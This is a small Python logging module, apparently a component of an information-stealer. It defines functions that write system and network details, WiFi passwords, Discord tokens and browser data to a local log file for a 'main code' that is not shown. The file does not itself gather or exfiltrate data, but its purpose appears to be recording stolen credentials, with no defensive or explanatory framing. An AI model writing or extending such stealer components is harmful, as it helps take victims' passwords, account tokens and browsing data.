# this is only for the main code to work with
import logging
from datetime import datetime


logging.basicConfig(filename='logs.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s')

def log_system_info(system_info):
    logging.info(f"System Info: {system_info}")

def log_network_info(network_info):
    logging.info(f"Network Info: {network_info}")

def log_wifipasswords(wifi_passwords):
    logging.info(f"WiFi Passwords: {wifi_passwords}")

def log_discord_tokens(discord_tokens):
    logging.info(f"Discord Tokens: {discord_tokens}")

def log_browser_data(browser_data):
    logging.info(f"Browser Data: {browser_data}")